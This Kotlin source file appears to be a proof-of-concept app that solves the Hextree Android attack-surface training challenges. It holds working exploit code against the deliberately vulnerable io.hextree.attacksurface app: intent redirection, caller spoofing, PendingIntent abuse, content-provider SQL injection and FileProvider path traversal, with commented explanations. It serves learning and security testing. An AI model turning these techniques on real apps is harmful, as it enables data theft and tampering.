package com.vishal2376.hextreepoc

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import androidx.core.net.toUri
import com.vishal2376.hextreepoc.Utils.dumpCursor


/**
 * Author: Vishal Singh (vishal2376)
 *
 * Android Attack Surface POC
 * Techniques used to exploit exported activities of target app.
 */

class Attack(private val context: Context, private val activity: HextreeActivity) {

	private val packageName = "io.hextree.attacksurface"

	/**
	 * FLAG 1 - Direct Activity Launch
	 * Technique: Explicit Intent
	 * Simply launch an exported activity directly using setClassName().
	 * Works when activity has android:exported="true" with no extra conditions.
	 */
	fun flag1() {
		val activityPath = "io.hextree.attacksurface.activities.Flag1Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		Utils.dumpIntent(context, intent, title = "Flag 1 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 2 - Custom Action Intent
	 * Technique: Intent Action Matching
	 * Target activity checks intent action before proceeding.
	 * We set the exact action string the activity expects to pass its condition.
	 */
	fun flag2() {
		val activityPath = "io.hextree.attacksurface.activities.Flag2Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		intent.action = "io.hextree.action.GIVE_FLAG"
		Utils.dumpIntent(context, intent, title = "Flag 2 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 3 - Action + URI Data
	 * Technique: Intent Action + Data URI
	 * Target activity validates both action and data URI.
	 * We craft an intent with the exact action and URI it expects.
	 */
	fun flag3() {
		val activityPath = "io.hextree.attacksurface.activities.Flag3Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		intent.action = "io.hextree.action.GIVE_FLAG"
		intent.data = "https://app.hextree.io/map/android".toUri()
		Utils.dumpIntent(context, intent, title = "Flag 3 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 4 - State Machine Exploitation
	 * Technique: User-triggered sequential intents (one real tap per transition)
	 *
	 * Flow:
	 * 1. Each button tap fires exactly ONE intent with the next required action
	 * 2. INIT -> PREPARE -> BUILD -> GET_FLAG -> success() (any action triggers it)
	 * 3. currentStateIndex cycles through the actions list on every tap
	 *
	 * Key insight: Handler.postDelayed() breaks this because Android's background
	 * activity launch restriction blocks startActivity() calls that fire after your
	 * app has already lost foreground (which happens right after the 1st intent).
	 * A real onClick() is always exempt from that restriction - every tap IS a fresh,
	 * legitimate user gesture, so there's no timing window to gamble against.
	 */

	private val actions = arrayOf(
		"PREPARE_ACTION",   // INIT -> PREPARE
		"BUILD_ACTION",     // PREPARE -> BUILD
		"GET_FLAG_ACTION",  // BUILD -> GET_FLAG
		"ANY_ACTION"        // GET_FLAG -> success() (any action triggers it)
	)

	private var currentStateIndex = 0

	fun flag4() {
		val activityPath = "$packageName.activities.Flag4Activity"

		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			action = actions[currentStateIndex]
			addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
		}

		Utils.dumpIntent(context, intent, title = "Flag 4 Intent ($currentStateIndex)")
		context.startActivity(intent)

		currentStateIndex = (currentStateIndex + 1) % actions.size
	}

	/**
	 * FLAG 5 - Nested Intent (Intent in Intent)
	 * Technique: Intent Extras Nesting
	 * Target activity extracts an inner intent from extras key "android.intent.extra.INTENT".
	 * Inner intent must have return=42 and a nextIntent with reason="back" to trigger success().
	 * We craft a 3-level nested intent structure to satisfy all conditions.
	 */
	fun flag5() {
		val activityPath = "$packageName.activities.Flag5Activity"

		// Level 3: nextIntent with reason="back" triggers success() directly
		val intent3 = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("reason", "back")
		}

		// Level 2: inner intent with return=42 and nextIntent attached
		val intent2 = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("return", 42)
			putExtra("nextIntent", intent3)
		}

		// Level 1: outer intent wrapping inner intent in standard extra key
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("android.intent.extra.INTENT", intent2)
		}

		Utils.dumpIntent(context, intent, title = "Flag 5 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 6 - Intent Redirect to Non-Exported Activity
	 * Technique: Intent Redirection via Exported Activity
	 * Flag6Activity is NOT exported — cannot be launched directly.
	 * Flag5Activity is exported and forwards nextIntent via startActivity().
	 * We abuse Flag5 as a launchpad to reach Flag6 indirectly.
	 * FLAG_GRANT_READ_URI_PERMISSION (flag=0x1) is required by Flag6 to call success().
	 * reason="next" tells Flag5 to call startActivity(nextIntent) instead of success() itself.
	 */
	fun flag6() {
		val activityPath = "$packageName.activities.Flag5Activity"
		val newActivityPath = "$packageName.activities.Flag6Activity"

		// Target: Flag6Activity with required flag set
		val intent3 = Intent().apply {
			setClassName(packageName, newActivityPath)
			putExtra("reason", "next")
			flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
		}

		// Inner intent satisfying Flag5's conditions, carrying nextIntent
		val intent2 = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("return", 42)
			putExtra("nextIntent", intent3)
		}

		// Outer intent to exported Flag5Activity (launchpad)
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("android.intent.extra.INTENT", intent2)
			flags = Intent.FLAG_ACTIVITY_NEW_TASK
		}

		Utils.dumpIntent(context, intent, title = "Flag 6 Intent")
		context.startActivity(intent)
	}

	/**
	 * FLAG 7 - onNewIntent() Lifecycle Exploitation
	 * Technique: Activity Lifecycle Abuse via FLAG_ACTIVITY_SINGLE_TOP
	 * Target activity checks action="OPEN" in onCreate() and action="REOPEN" in onNewIntent().
	 * onNewIntent() is only called when activity is already running and receives a new intent.
	 * Step 1: Launch activity with action="OPEN" to initialize it.
	 * Step 2: Send second intent with action="REOPEN" + FLAG_ACTIVITY_SINGLE_TOP
	 *         so Android routes it to onNewIntent() instead of creating new instance.
	 * Delay ensures activity is fully created before second intent arrives.
	 */
	fun flag7() {
		val activityPath = "$packageName.activities.Flag7Activity"

		// Step 1: Launch and initialize activity
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			action = "OPEN"
			flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
		}
		context.startActivity(intent)

		// Step 2: Trigger onNewIntent() after activity is created
		Handler(Looper.getMainLooper()).postDelayed({
			val newIntent = Intent().apply {
				setClassName(packageName, activityPath)
				action = "REOPEN"
				flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
			}
			context.startActivity(newIntent)
		}, 500)
	}

	/**
	 * FLAG 8 - Caller Identity Verification Bypass
	 * Technique: startActivityForResult + Caller Class Name Spoofing
	 * Target activity uses getCallingActivity() to verify the caller's class name.
	 * getCallingActivity() only returns a value when started via startActivityForResult().
	 * It checks if caller class name contains "Hextree" before calling success().
	 * We use HextreeActivity (which contains "Hextree" in name) to call startActivityForResult()
	 * so getCallingActivity() returns "HextreeActivity" → condition passes → success().
	 */
	fun flag8() {
		val activityPath = "$packageName.activities.Flag8Activity"

		// Launch Flag8 via startActivityForResult from HextreeActivity
		// so getCallingActivity() = "HextreeActivity" contains "Hextree"
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
		}
		activity.startActivityForResult(intent, 8)
	}

	/**
	 * FLAG 9 - Result Data Stealing via startActivityForResult
	 * Technique: Caller Identity Spoofing + Result Interception
	 * Same as Flag8 — target activity verifies caller contains "Hextree" via getCallingActivity().
	 * Additionally, target activity sends back sensitive data (flag) via setResult(-1, intent).
	 * setResult(-1) = RESULT_OK — target finished successfully and returns data to caller.
	 * We capture the returned intent in onActivityResult() and display it via Utils.showDialog().
	 * This simulates a real attack where a malicious app steals result data from another app.
	 */
	fun flag9() {
		val activityPath = "$packageName.activities.Flag9Activity"

		// Launch Flag9 via startActivityForResult from HextreeActivity
		// so getCallingActivity() = "HextreeActivity" contains "Hextree"
		// Flag9 will call setResult(-1, intent) sending flag back to onActivityResult()
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
		}
		activity.startActivityForResult(intent, 9)
	}

	/**
	 * FLAG 12 - Implicit Intent Interception
	 * Technique: Intent Filter Registration + Result Manipulation
	 *
	 * Flow:
	 * 1. We launch Flag12Activity with LOGIN=true extra
	 * 2. Flag12 sends implicit intent "io.hextree.attacksurface.ATTACK_ME"
	 * 3. Our HextreeActivity intercepts it (registered in manifest for this action)
	 * 4. We return token=1094795585 (0x41414141) back via setResult()
	 * 5. Flag12's onActivityResult() validates LOGIN=true + token → success()
	 *
	 * Key insight: Flag12 trusts whoever handles its implicit intent.
	 * Any app registered for that action can intercept and respond with fake data.
	 */
	fun flag12() {
		val activityPath = "$packageName.activities.Flag12Activity"
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("LOGIN", true) // required — onActivityResult() checks this
			addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
		}
		context.startActivity(intent)
	}

	/**
	 * FLAG 16 - Basic Broadcast Receiver
	 * Technique: Explicit Broadcast to Exported Receiver
	 *
	 * Flow:
	 * 1. Send explicit intent to Flag16Receiver via setClassName()
	 * 2. Receiver checks intent.getStringExtra("flag") against hardcoded secret "give-flag-16"
	 * 3. Match -> success() called directly inside onReceive()
	 *
	 * Key insight: onReceive() has no sender verification at all - it trusts the
	 * "flag" extra purely by value, no check on who sent it. Same pattern as
	 * Flag2's action-string check, just via sendBroadcast() instead of startActivity().
	 */
	fun flag16() {
		val receiverPath = "$packageName.receivers.Flag16Receiver"
		val intent = Intent().apply {
			setClassName(packageName, receiverPath)
			putExtra("flag", "give-flag-16")
		}
		activity.sendBroadcast(intent)
	}

	/**
	 * FLAG 22 - Receive Pending Intent
	 * Technique: PendingIntent as Attack Vector
	 *
	 * Flow:
	 * 1. We create a mutable PendingIntent pointing back to our HextreeActivity
	 * 2. Send it to Flag22Activity via "PENDING" extra
	 * 3. Flag22 fills in success=true and flag into our PendingIntent
	 * 4. Flag22 calls pendingIntent.send() — fires back to our HextreeActivity
	 * 5. onNewIntent() receives the intent with flag data
	 *
	 * Key insight: FLAG_MUTABLE allows Flag22 to inject extras (flag, success)
	 * into our PendingIntent before sending it back. Immutable would block this.
	 * FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT required for Android 15 strict mode.
	 */
	fun flag22() {
		val activityPath = "$packageName.activities.Flag22Activity"

		// Receiver intent: points back to our own HextreeActivity
		// FLAG_ACTIVITY_SINGLE_TOP ensures onNewIntent() is called
		// instead of creating a new HextreeActivity instance
		val receiverIntent = Intent(context, HextreeActivity::class.java).apply {
			action = "FLAG22_RESULT"
			addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
		}

		// FLAG_MUTABLE: allows Flag22 to add extras (flag, success) before sending
		// FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT: required on Android 15 for PendingIntent delivery
		val pendingIntent = PendingIntent.getActivity(
			context,
			22,
			receiverIntent,
			PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT
		)

		// Send PendingIntent to Flag22 via "PENDING" extra
		// Flag22 will call pendingIntent.send(context, 0, intentWithFlag)
		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("PENDING", pendingIntent)  // Flag22 extracts and fires this
			addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
		}
		context.startActivity(intent)
	}


	// ------------------- Content Providers Flags ------------------------//

	/**
	 * FLAG 30 - Basic Content Provider Query
	 * Technique: Direct URI query on exported ContentProvider
	 *
	 * Flow:
	 * 1. Query content://io.hextree.flag30/success
	 * 2. Provider checks uri.getPath().equals("/success") → passes
	 * 3. Provider runs SELECT * FROM flag WHERE name='flag30' AND visible=1
	 * 4. Calls success() → decrypts flag, writes to DB
	 * 5. Internally starts Flag30Activity with random UUID secret → flag shown
	 *
	 * Key insight: Provider ignores our selection parameter entirely — uses
	 * its own hardcoded WHERE clause with parameterized query (safe from injection).
	 * Only the URI path matters. Wrong path → returns null, nothing happens.
	 */
	fun flag30() {
		val uri = "content://io.hextree.flag30/success"

		dumpCursor(
			context = context,
			uri = uri,
			title = "Flag 30"
		)
	}


	/**
	 * FLAG 31 - Content Provider URI Matching
	 * Technique: Correct URI pattern to satisfy UriMatcher routing
	 *
	 * Flow:
	 * 1. Query content://io.hextree.flag31/flag/31
	 * 2. UriMatcher matches "flag/#" pattern → code 2 (FLAG_ID)
	 * 3. ContentUris.parseId(uri) extracts ID = 31
	 * 4. Provider checks: if (id == 31) → calls success()
	 * 5. Internally starts Flag31Activity with UUID secret → flag shown
	 *
	 * Key insight: Three URI paths exist — only one works:
	 * /flags       → code 1 → throws exception (not implemented)
	 * /flag/{id}   → code 2 → valid, but only id=31 triggers success()
	 * anything else → IllegalArgumentException
	 * Must read UriMatcher setup in JADX to find the exact ID required.
	 */
	fun flag31() {
		val uri = "content://io.hextree.flag31/flag/31"

		dumpCursor(
			context = context,
			uri = uri,
			title = "Flag 31"
		)
	}

	/**
	 * FLAG 32 - SQL Injection via Content Provider
	 * Technique: WHERE clause injection through unsanitized selection parameter
	 *
	 * Flow:
	 * 1. Query /flags URI (UriMatcher code 1) — the only injectable path
	 * 2. Provider concatenates our selection: "visible=1 AND (" + selection + ")"
	 * 3. Inject "1=1) OR (1=1" to break out of the AND block
	 * 4. Final SQL: WHERE visible=1 AND (1=1) OR (1=1) — returns ALL rows
	 * 5. containsFlag32(cursor) finds flag32 row in results → success()
	 *
	 * Key insight: flag32 has visible=0 in DB so "OR 1=1" inside the AND block
	 * still fails (visible=1 filters it). Must inject AFTER the closing ")" to
	 * add OR at SQL level — bypassing the entire visible=1 constraint.
	 */
	fun flag32() {
		val uri = "content://io.hextree.flag32/flags"

		dumpCursor(
			context = context,
			uri = uri,
			title = "Flag 32",
			// Add SQL injection to test selection
			selection = "1=1) OR (1=1"
		)
	}

	/**
	 * FLAG 33.1 - Return Provider Access
	 * Technique: startActivityForResult + URI grant via setResult()
	 *
	 * Flow:
	 * 1. Start Flag33Activity1 (exported=true) with action="io.hextree.FLAG33"
	 * 2. Activity1 builds a result intent: data=content://io.hextree.flag33_1/flags,
	 *    flags=1 (FLAG_GRANT_READ_URI_PERMISSION)
	 * 3. setResult(RESULT_OK, that intent) -> finish() -> delivered to onActivityResult()
	 * 4. We receive a temporary read grant on that exact URI
	 * 5. Query it with table-swap injection to read from Note table instead of Flag table
	 *
	 * Key insight: exported=false on the provider doesn't matter here - the grant from
	 * setResult() bypasses it entirely, same mechanism as Flag6's FLAG_GRANT_READ_URI_PERMISSION
	 * but delivered via a result intent instead of an intent redirect.
	 */
	fun flag33A1() {
		val activityPath = "$packageName.activities.Flag33Activity1"

		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			action = "io.hextree.FLAG33"
		}
		activity.startActivityForResult(intent, 331)
	}

	/**
	 * FLAG 34 - Simple File Provider
	 * Technique: FileProvider URI access via "filename" extra
	 *
	 * Flow:
	 * 1. Launch Flag34Activity with filename="flags/flag34.txt"
	 * 2. Activity writes the real decrypted flag content into that file on disk
	 * 3. Returns a content:// URI (via FileProvider) pointing to it, with read+write grant
	 * 4. We read the file content through the granted URI in onActivityResult()
	 *
	 * Key insight: Flag34Activity never calls success() internally - there's no code
	 * path that marks it "solved" in the app's own UI. Reading the flag text via the
	 * returned URI IS the complete solve; the app just doesn't tick this one visually.
	 */
	fun flag34() {
		val activityPath = "$packageName.activities.Flag34Activity"

		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("filename", "flags/flag34.txt")
		}
		activity.startActivityForResult(intent, 34)
	}

	/**
	 * FLAG 35 - Root-File Provider
	 * Technique: Path traversal via overly permissive FileProvider root-path config
	 *
	 * Flow:
	 * 1. Launch Flag35Activity with filename="../flag35.txt"
	 * 2. Its FileProvider authority "io.hextree.root" is configured with root-path="/"
	 *    (no folder restriction) - so ".." walks outside the intended sandbox
	 * 3. Activity returns a content:// URI with BOTH read+write grant (flags=3)
	 * 4. We read the file content through the granted URI in onActivityResult()
	 *
	 * Key insight: Unlike Flag34's narrow "flags/" folder restriction, Flag35's
	 * root-path="/" means the "filename" parameter can traverse to ANY file on the
	 * filesystem the app's UID can access - this is what makes Flag36 possible too.
	 */
	fun flag35() {
		val activityPath = "$packageName.activities.Flag35Activity"

		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("filename", "../flag35.txt")
		}
		activity.startActivityForResult(intent, 35)
	}

	/**
	 * FLAG 36 - Overwriting Shared Prefs
	 * Technique: Arbitrary file WRITE via Flag35's root-path traversal + write grant
	 *
	 * Flow:
	 * 1. Reuse Flag35Activity (not Flag36Activity) - it's the one with write access
	 * 2. filename="../shared_prefs/Flag36Preferences.xml" traverses to the real
	 *    SharedPreferences file backing Flag36Activity's solved check
	 * 3. Receive the URI with write grant (flags=3, same as Flag35)
	 * 4. Overwrite the file content to set solved="true" in valid XML shape
	 * 5. Flag36Activity.onCreate() reads Flag36Preferences.getBoolean("solved") -> success()
	 *
	 * Key insight: Flag36Activity itself has NO exploitable vulnerability - it just
	 * trusts whatever is on disk. The real bug is entirely in Flag35's unrestricted
	 * write access, which lets us modify a completely different flag's private state.
	 */
	fun flag36() {
		val activityPath = "$packageName.activities.Flag35Activity"

		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			putExtra("filename", "../shared_prefs/Flag36Preferences.xml")
		}
		activity.startActivityForResult(intent, 36)
	}

	/**
	 * FLAG 37 - Filename Traversal
	 * Technique: Custom malicious ContentProvider fabricating file metadata + content
	 *
	 * Flow:
	 * 1. We register our own exported ContentProvider (FileAttackProvider)
	 * 2. Send its URI to Flag37Activity via intent.data with FLAG_GRANT_READ_URI_PERMISSION
	 * 3. Flag37Activity queries us - we return a fake Cursor claiming
	 *    _display_name="../flag37.txt" and _size=1337 (no real file backs this)
	 * 4. It then calls openFile() on the same URI - we stream "give flag" through
	 *    a pipe (ParcelFileDescriptor.createPipe()) instead of a real file
	 * 5. All three checks pass (name + size + exact content) -> success()
	 *
	 * Key insight: ContentProvider never validates that query() and openFile() agree
	 * with reality - they're two independent calls we fully control. A pipe lets us
	 * fabricate file content live, with nothing on disk at all. exported="true" is
	 * required since Flag37Activity runs in a different app/UID than ours.
	 */
	fun flag37() {
		val activityPath = "$packageName.activities.Flag37Activity"

		val intent = Intent().apply {
			setClassName(packageName, activityPath)
			data = "content://io.hextree.fileattack.FileAttackProvider".toUri()
			addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
		}
		activity.startActivityForResult(intent, 37)
	}
}
